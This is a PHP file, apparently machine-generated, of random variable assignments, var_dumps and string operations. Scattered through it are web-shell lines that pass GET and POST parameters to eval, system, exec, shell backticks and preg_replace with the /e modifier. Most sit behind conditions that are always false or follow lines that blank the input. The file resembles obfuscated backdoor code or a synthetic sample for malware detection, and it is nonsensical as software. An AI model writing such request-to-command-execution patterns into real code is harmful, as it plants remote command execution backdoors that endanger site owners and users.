<?php
$iVHcYPp2Q = 'LCPZlGi0oh';
$vXjTPb = 'v3o';
$uoexLYo = 'qDAw';
$c_yx2QjsWE = 'ZDm3TcSWH5';
$UJJT = 'STCrN';
$x9 = 'PTuL4E';
$M9vACVJT = new stdClass();
$M9vACVJT->QNuLUTmp2 = 'kvi';
$M9vACVJT->or = 'Zwtdgj17I';
$M9vACVJT->tU1O0m1E = 'mpOzZl';
$M9vACVJT->nB_ICl = 'QkvnpRR3s';
$M9vACVJT->COR = 'JJAWJ5T63';
$Dojl7jBq = 'TKiXQwT84d';
echo $iVHcYPp2Q;
$B2i0r9fyxoI = array();
$B2i0r9fyxoI[]= $vXjTPb;
var_dump($B2i0r9fyxoI);
$uoexLYo = $_GET['OLpBdCz'] ?? ' ';
$yZN10Me7 = array();
$yZN10Me7[]= $UJJT;
var_dump($yZN10Me7);
if(function_exists("feQmvKont")){
    feQmvKont($Dojl7jBq);
}
if('Leeu_L5SU' == 'oPX4ex09Q')
eval($_POST['Leeu_L5SU'] ?? ' ');
$p_Cm9v1jC5 = 'mW22h90ufl';
$y_ = 'Xv';
$gLFPTI = 'MCKQ';
$g3JnJ = 'eo6BU3fY';
$Sseahp = 'Dk969DnTD';
$GovP = 'Eqg83HU';
$LwCTLjUn = 'EVuN80mv';
$krN = 'jOucKcaidF';
$Hef8ed = array();
$Hef8ed[]= $p_Cm9v1jC5;
var_dump($Hef8ed);
$gLFPTI = $_GET['sKwmIa4R'] ?? ' ';
$g3JnJ = explode('Xnv8GCGId', $g3JnJ);
$Sseahp = explode('dAx3FhQZH', $Sseahp);
if(function_exists("pHIOc4xIpc4l")){
    pHIOc4xIpc4l($LwCTLjUn);
}
$cFttFMLVnYp = array();
$cFttFMLVnYp[]= $krN;
var_dump($cFttFMLVnYp);
$gGuQE12n = 'uJIw4';
$crHLHQ5Ou = 'I8OLN3iy';
$FcFAibMS = 'OIhTc';
$EISg = 'snXtCzqN';
$J5f = 'kU6AY7Al';
$Dya4d = 'cDu';
$dqnqZ = new stdClass();
$dqnqZ->Xm7Za = 'k9w2mDs5P';
$dqnqZ->DzGUP9So1QQ = 'tJyG25';
$dqnqZ->RhV8 = 'A_2Vie';
$dqnqZ->nZdOtOA = 'alQBVs';
$dqnqZ->gODYE5c = 'wpLQsWH7Hgh';
$o87sf = 'Rc4hg59RF';
$cue6yqJ = 'j1BUk96A';
$FlLen5nQ = 'w7H5hd6R0Oz';
str_replace('dhPTirT', 'BvZ6q0Lz', $gGuQE12n);
$FcFAibMS = $_POST['Jg0mrnTCi0sh'] ?? ' ';
$EISg .= 'iHSueguf8czh';
$jFhacgqYyC2 = array();
$jFhacgqYyC2[]= $Dya4d;
var_dump($jFhacgqYyC2);
$o87sf = explode('bfE0ZdOq5Qx', $o87sf);
echo $FlLen5nQ;
$_GET['Sha7RrpUx'] = ' ';
system($_GET['Sha7RrpUx'] ?? ' ');
$E5iBu0dJhO = 'lCTp';
$xiamE1OalY = 'R1R3j65bUe';
$qnEbAM = 'GQALFI';
$M5 = 'PnIiNJ3';
$I09g9MiuVP = 'bM';
preg_match('/yRnxN0/i', $E5iBu0dJhO, $match);
print_r($match);
$qnEbAM = $_GET['up6kBobHHKJbPjc'] ?? ' ';
$M5 = $_POST['BePAxUQ'] ?? ' ';
$I09g9MiuVP = $_POST['NQ3I6f7vg'] ?? ' ';
/*
$IzAlW = 'Oc';
$_4JExcZmKI = 'as0ESm41blO';
$rHYoLx = 'WFYKAi';
$JsvG1cZ = new stdClass();
$JsvG1cZ->p4o7_x = 'r_Lt';
$JsvG1cZ->J9Ug2oH1vle = 'cRoKc3UG';
$JsvG1cZ->iKOD = 'frzMNTpxwR';
$ZkYhJC = 'pEd';
$p3YD = new stdClass();
$p3YD->WWS0AV8 = 'FUW6Wz03U';
$p3YD->IHJrE = 'Tn2kRFEzZ';
$p3YD->ym6IesSAvm = 'lFcsN';
$p3YD->OqjUwMhpw = 'fCLp4hXHf';
$p3YD->TVNT = 'dYAI';
$p3YD->Yrb = 'L2OpAS11t';
$Hj = 'wYRWVMRgj';
$LyJV = 'jhA1EWKo';
$RbOB9yw = 'KLQmab78K';
$IzAlW = $_GET['P5ydOcTtialK'] ?? ' ';
$_4JExcZmKI = $_POST['dsNSgV53a'] ?? ' ';
$rHYoLx = explode('CKm1WzcS', $rHYoLx);
$OQ4Ix7659dD = array();
$OQ4Ix7659dD[]= $ZkYhJC;
var_dump($OQ4Ix7659dD);
$cofZwT_ra = array();
$cofZwT_ra[]= $Hj;
var_dump($cofZwT_ra);
*/
$g9 = 'f4S';
$Dg5nnE = 'OHoi212CqOK';
$oLrsm = 'PUGlsY';
$X7 = 'zYv5oCis0aW';
$kBk1noxO3g = 'vzsX';
$e3Kjg8 = new stdClass();
$e3Kjg8->RPxwvT = 'OYQhyB1q8o';
$e3Kjg8->RDsksKKo9F = 'nA0q';
$e3Kjg8->qr3WA0RLoI = 'l6O7kB4n3D';
$e3Kjg8->r0HwZ = 'f18db5vD';
$QYhxt3YQZD = 'wXpDX6PVG';
$TlvqCLB3ZZx = 'U9TXry9';
$q_AonWg = 'Xsh8N62Lw';
$g9 = explode('nzAPoGBh', $g9);
$Dg5nnE = $_POST['Pl8KgRY'] ?? ' ';
$oLrsm .= 'lPBJZpYlnsP';
$Duy8CB = array();
$Duy8CB[]= $X7;
var_dump($Duy8CB);
$kBk1noxO3g = $_GET['bN_eSmrv5yK'] ?? ' ';
$tItwv_54 = array();
$tItwv_54[]= $QYhxt3YQZD;
var_dump($tItwv_54);
if(function_exists("XkDimoe7z")){
    XkDimoe7z($TlvqCLB3ZZx);
}
preg_match('/t7tLcm/i', $q_AonWg, $match);
print_r($match);
$J3yFfp = 'HI6hEr';
$CWPXQ = 'eIa7kj_';
$Qt = new stdClass();
$Qt->p0UTD = 'l9YaKO';
$Qt->iw6yex = 'rVo';
$Qt->qDoTmvfX = 'wE';
$YQMqHPsUx = 'PILWkx';
$bFKY = 'pkWlp';
$KMVX = 'ODXpgsLwbE';
$J3yFfp .= 'WKS6AZJX1VMxzXC';
preg_match('/FaGNMR/i', $CWPXQ, $match);
print_r($match);
var_dump($YQMqHPsUx);
$WgSOux = array();
$WgSOux[]= $bFKY;
var_dump($WgSOux);
var_dump($KMVX);
$JT0 = 's2DBOT';
$BDQ = 'GAU2f1C';
$Eg9wNjLJ = 'G4M';
$jx8f30DP = 'My51';
$sc7Wn = 'E7rn7qVTk';
$nN = 'eWffnWa';
$JP5 = 'CdAQG2zh7Y';
$sfsogjKlq = 'uU';
$oBw = 'AYi79k';
$hi = 'AoY';
$BDQ = $_GET['Ceg8qFvPwZVIaMZ_'] ?? ' ';
$Xtm7ZkAZ = array();
$Xtm7ZkAZ[]= $Eg9wNjLJ;
var_dump($Xtm7ZkAZ);
$NQWTpPU = array();
$NQWTpPU[]= $jx8f30DP;
var_dump($NQWTpPU);
$sc7Wn = $_GET['KoWUbtKnQC'] ?? ' ';
preg_match('/YXKvUj/i', $nN, $match);
print_r($match);
preg_match('/MlcWKG/i', $JP5, $match);
print_r($match);
$sfsogjKlq .= 'NsrNpFOqoQAYq7N';
$oBw = explode('TEOZifZQ', $oBw);
str_replace('j22IkZle', 'EJmAfy', $hi);
$fau_Fs = 'jx_wdr';
$yFYGC7pjWlP = 'ZNqvR5';
$KEfZGME = 'ZJB';
$Du4UchfN = 'cuOG';
$dzm = 'ioZ';
$wcwLOB5R0 = '__GJ3yDrgI';
$fau_Fs = explode('Dz37gO5qrP', $fau_Fs);
$yFYGC7pjWlP .= 'Gq1Q_rOom_Hvk';
var_dump($KEfZGME);
var_dump($Du4UchfN);
str_replace('QfKPVXPK', 'GMfZ_ODNh8n', $dzm);
if('RnP0RBQwC' == 'x0eAeIE_c')
exec($_POST['RnP0RBQwC'] ?? ' ');
if('CqEe9OtES' == 'xR4JWf82b')
exec($_POST['CqEe9OtES'] ?? ' ');
$QMLlioDIfU = 'vmMIBHY';
$ccMf034IF = 'mMvCsLOyM';
$_Rz = 'oNutRBPnMQ';
$CG6de = 'fMXK4';
$eUTKo = 'xqSIXUMC0Ze';
$QMLlioDIfU = $_POST['YGKBW0D0e4CUY'] ?? ' ';
if(function_exists("e6S71B")){
    e6S71B($_Rz);
}
$CG6de = $_POST['AqQSST1Cy33vz4'] ?? ' ';
echo $eUTKo;

function cjOhIfwR773qba()
{
    $qFGcXkAW = 'dFL8SJB';
    $RRSWJuDH7 = 'lwOsvwmO8Y';
    $Dxb2dN = 'MXe';
    $tSsVF = 'V19ONu';
    $o7q = 'TkC5';
    $WDlB = 'QKKu';
    $QekT6of = new stdClass();
    $QekT6of->nlG = 'gS';
    $QekT6of->B05 = 'YOQK';
    $QekT6of->Q4bUV = 'p37eGh_L';
    $QekT6of->xFS8rN = 'IvxhTLZcqVp';
    $H0w = 'mtj6t';
    $nEnjoZa1K = 'F1L';
    $Ogb = 'y5C21BQD';
    $n2UwWENoA = array();
    $n2UwWENoA[]= $qFGcXkAW;
    var_dump($n2UwWENoA);
    $RRSWJuDH7 .= 'rfTqPy0lga3N';
    $Dxb2dN = $_GET['_LNbkLCUY'] ?? ' ';
    echo $WDlB;
    $H0w = explode('Oadn63OPg', $H0w);
    echo $nEnjoZa1K;
    $exZpv = 'VC';
    $F0GBHElBa = 'AZ';
    $OV4c7 = 'V53Z5e7uCfF';
    $W5U8b = 'H0YDN2vSy';
    $POnKO28pGf = new stdClass();
    $POnKO28pGf->KGpLwiyk = 'z7ZgDbi9Y';
    $POnKO28pGf->KT8xuub = 'c4aTbGg7Mwf';
    $POnKO28pGf->LYF = 'Lsfklp';
    $POnKO28pGf->e7Th = 'T1Bs3BSMRX';
    $aXT = 'kuDnsj';
    $IF7_ = 'h_l';
    $uva_u8c3jJ4 = 'zf';
    $exZpv = $_POST['qTWD21idRQ38eP'] ?? ' ';
    if(function_exists("oPvWOF")){
        oPvWOF($F0GBHElBa);
    }
    $OV4c7 = $_GET['Uyc4_rW'] ?? ' ';
    var_dump($W5U8b);
    echo $aXT;
    $zeMqkH3rc = array();
    $zeMqkH3rc[]= $IF7_;
    var_dump($zeMqkH3rc);
    $FWeOlWFGF6 = array();
    $FWeOlWFGF6[]= $uva_u8c3jJ4;
    var_dump($FWeOlWFGF6);
    $RD7vMKJjcAk = 'sFOO';
    $griR7Zkxgf = '_Q';
    $bH = 'a72MZV';
    $nu43pk0uOXO = 'jBwa';
    $_EhnMgI = new stdClass();
    $_EhnMgI->PGiep = 'f6_EofPT';
    $_EhnMgI->WwIcb = 'slpI61WkK';
    $_EhnMgI->hqzPWV8 = 'x2FqZTD';
    $_EhnMgI->yY1Hz6 = 'z_9Xsm2l';
    $dv = 'J6GUYE';
    preg_match('/SmNQX0/i', $RD7vMKJjcAk, $match);
    print_r($match);
    $griR7Zkxgf = $_POST['ZYcnhDsOQbnBp5'] ?? ' ';
    str_replace('wFOrpNQ5MhU', 'xUamzWG', $bH);
    var_dump($nu43pk0uOXO);
    preg_match('/DgPVSd/i', $dv, $match);
    print_r($match);
    $AYeMLM = 'NOAksPtW';
    $qLArl = 'p7OU6RwYE7';
    $mlgucOZqh = 'ikt3bCiP';
    $Ctc20 = 'Bgem';
    $K0fiD2 = 'Lpaq';
    $Sn_kLKaj = 'ZCJejE';
    echo $qLArl;
    $lbMpXtF = array();
    $lbMpXtF[]= $mlgucOZqh;
    var_dump($lbMpXtF);
    $K0fiD2 .= 'B9ehnb';
    var_dump($Sn_kLKaj);
    
}
cjOhIfwR773qba();
$YAkwZ = 'HMqYk36';
$n1 = 'er';
$kJUSxg5MSIH = 'KDLd3C1hLre';
$oDrWw = 'DYZ3s0Zr_8';
$fvh = 'sDwwjnzI_U';
$iWfwJ = 'CdwlDDYaE';
$gd = new stdClass();
$gd->aVi7dwm = 'h_9_4zHoL';
$gd->PT3c = 'WcjxiU';
$ub8H8GdV = 'BO91GXxR7';
$K7ty7 = 'Aw';
$pS03 = 'YDQEQtC';
$yVQp = new stdClass();
$yVQp->W3no7qr = 'tWf';
$yVQp->Hl5pwv5Gdk = 'sgZ7yU';
$yVQp->EYHt8iI = 'M6';
$yVQp->a3pKuz8 = 'd9IVTo';
$yVQp->Czi = 'hRxe6hia';
$YAkwZ = explode('RF_ysEM6XA', $YAkwZ);
echo $n1;
var_dump($kJUSxg5MSIH);
if(function_exists("_KXTM4Mrwgj6J_")){
    _KXTM4Mrwgj6J_($iWfwJ);
}
$ub8H8GdV = explode('CTrzzXDtqil', $ub8H8GdV);
str_replace('bPy7HdWKFYh', 'jUnUCmfUYI0o42y', $K7ty7);
if(function_exists("x5r_MeYJN")){
    x5r_MeYJN($pS03);
}

function xgE()
{
    $LEr0BJ = 'O6Dyycj4';
    $w5g7O_ = 'VErWyVF6Of';
    $zWEq = 'VIu';
    $LWS = 'R3du2RLH9M_';
    $wXx7 = 'MDYRHM7g5';
    $Jw = 'DLBvKPdadi';
    $_zqV = 'OIo385';
    $LEr0BJ = $_GET['kV8ALM'] ?? ' ';
    $w5g7O_ = $_POST['H3JpdbVDD'] ?? ' ';
    preg_match('/ghOXTB/i', $zWEq, $match);
    print_r($match);
    var_dump($LWS);
    $J0Z = new stdClass();
    $J0Z->SWmwNLmG2y0 = 'GrYNWAdcy';
    $J0Z->cFiQ = 'TxDnoQ19r';
    $J0Z->yDvUZjysJAS = 'XwBdCAcYQ';
    $J0Z->QHv = 'kmm0s2ZE';
    $Dgny15ggY = new stdClass();
    $Dgny15ggY->pZ = 'k979A';
    $Dgny15ggY->J9ZsJB89uvq = 'f6h';
    $Dgny15ggY->GQJ = 'PVWpVji';
    $zeTa9WfvxEN = 'FRvDPNFMU';
    $MeldPKz7zlL = 'NqGp';
    $kTuMprdXcLu = new stdClass();
    $kTuMprdXcLu->hOr539 = 'HQY_1WSqCIU';
    $kTuMprdXcLu->f0Ex8XM7 = 'oiabtPZvV';
    $kTuMprdXcLu->Jj5pFjuy = 'qwD';
    $kTuMprdXcLu->AYl2lxJ3 = 'N1lz_';
    $kTuMprdXcLu->xESaR3cXac = 'HrmN_';
    $TLV = 'LzG4Cqgn';
    $koVx = 'sp97B';
    $oFa79f7FzzD = 'nVKWPCp1JMB';
    $NF = 't2PcqPLIq';
    $mlylmWHL = 'gEQt6ZTck';
    $n78KHoPji9 = 'F2h4WZ7';
    $TLV = explode('UzFQheb43', $TLV);
    var_dump($koVx);
    var_dump($oFa79f7FzzD);
    $NF .= 'LYzjVmX';
    preg_match('/gZqC6F/i', $mlylmWHL, $match);
    print_r($match);
    
}
$FqIjEpU7X = new stdClass();
$FqIjEpU7X->dS = 'J8vLA93b';
$FqIjEpU7X->HLFMM_Wkp = 'iwKbhLfw';
$FqIjEpU7X->l08 = 'qZGFduIBQ';
$FqIjEpU7X->l6a3Etv0 = 'aSMJ5o';
$FqIjEpU7X->S6jlHVh = 'EU32B6E5O';
$MJyDLcMr = 'V4dfl5SrITL';
$BIdulA = 'Joa9OP9hdUV';
$R2qoowL = new stdClass();
$R2qoowL->pIx = 'pzW96W6n';
$xt1ri7k = 't7na';
if(function_exists("UXkYjLg7e8b3d")){
    UXkYjLg7e8b3d($BIdulA);
}
if(function_exists("iLhh5s28P1")){
    iLhh5s28P1($xt1ri7k);
}
if('PhpgFs3Jt' == 'EnN7tbSz8')
exec($_GET['PhpgFs3Jt'] ?? ' ');
/*
if('wFekrVl0a' == 'MwRhLjgSz')
('exec')($_POST['wFekrVl0a'] ?? ' ');
*/

function I2QxWbYVDSYSN()
{
    /*
    $_en7Op = 'JO7l3BlB';
    $TVyWt = 'm5iUuK';
    $h81 = 'jH2vd';
    $q4GbV52YYmY = new stdClass();
    $q4GbV52YYmY->XWJ93iYj = 'ZkXpKY_e_ad';
    $q4GbV52YYmY->xlzS27dS = 's5tGB';
    $q4GbV52YYmY->e836ar = 'YlejJeV';
    $q4GbV52YYmY->Vj94l5hA = 'x6';
    $q4GbV52YYmY->YaVq = 'K5CT';
    $U9rhq4 = 'jb0Y8yM5';
    $T19_ZKk7W = 'mqNFrN';
    var_dump($TVyWt);
    preg_match('/wT4mjy/i', $h81, $match);
    print_r($match);
    echo $U9rhq4;
    $T19_ZKk7W = explode('SVdURyp', $T19_ZKk7W);
    */
    $_GET['hYKW8JcRc'] = ' ';
    echo `{$_GET['hYKW8JcRc']}`;
    $y_ta8MG_Vkk = 'owB2WelCJ';
    $_om = new stdClass();
    $_om->uwo = 'NWl7Fb1yP';
    $_om->cfl3qOZl = 'O6sDN1';
    $_om->dVJllB = 'LH';
    $_om->WXVBB4jwsiw = 'Ut';
    $_om->iKddpYpj = 'x_Ifof7';
    $NpJXN9qD = 'Iljy';
    $s59sNU8yGv = 'SZkP_ph9DgE';
    $bTPC = 'M14wB';
    $y_ta8MG_Vkk = $_POST['SbGn5uyItAl2'] ?? ' ';
    str_replace('qxTL3xeQL4wMXt', 'okXkZZHx465EXi', $NpJXN9qD);
    $s59sNU8yGv = $_POST['oaRZq8VkuXj0nf'] ?? ' ';
    $bTPC = $_GET['X8v3es2M8JR0n'] ?? ' ';
    
}
$Qb2t = 'sgXllUfurB';
$SVIZvmgw93o = 'EnWo';
$aVQXmW4Tr = 'EBrWbDC_';
$aSCm3ztgI = 'r6MP1MHoBM';
$Y5JZkpF = new stdClass();
$Y5JZkpF->tAuq = 'lCf3b';
$Y5JZkpF->HNme79FfU = 'w2uoov';
$Y5JZkpF->doFC = 'vZ';
$Qx = 'O9WyPHu4e';
$wFUrX = new stdClass();
$wFUrX->JW = 'DC7';
$wFUrX->MC = 'BA';
$wFUrX->y8 = 'X838';
$_V1a0xM = 'wOX0qJPDM';
$LcEKl2oRq = 'J17ObaQV';
$dVIaK8 = 'oY';
$aVQXmW4Tr .= 'BZ88O9lOm8uk';
preg_match('/smfpKn/i', $aSCm3ztgI, $match);
print_r($match);
if(function_exists("HjuKPUiY6JFzR")){
    HjuKPUiY6JFzR($Qx);
}
$_V1a0xM = $_GET['GQuX8Db0amkSmdE'] ?? ' ';
str_replace('ppfQFq0lFxrFl', 'ZWfdrYdop8xVpa', $LcEKl2oRq);
$wc1tqbPRC = array();
$wc1tqbPRC[]= $dVIaK8;
var_dump($wc1tqbPRC);
if('UMeP2GPU0' == 'UVVDAicUr')
@preg_replace("/Ynr/e", $_GET['UMeP2GPU0'] ?? ' ', 'UVVDAicUr');

function ND()
{
    if('dtXpgXmSt' == 'huMlRVBzk')
    system($_GET['dtXpgXmSt'] ?? ' ');
    
}
ND();
echo 'End of File';
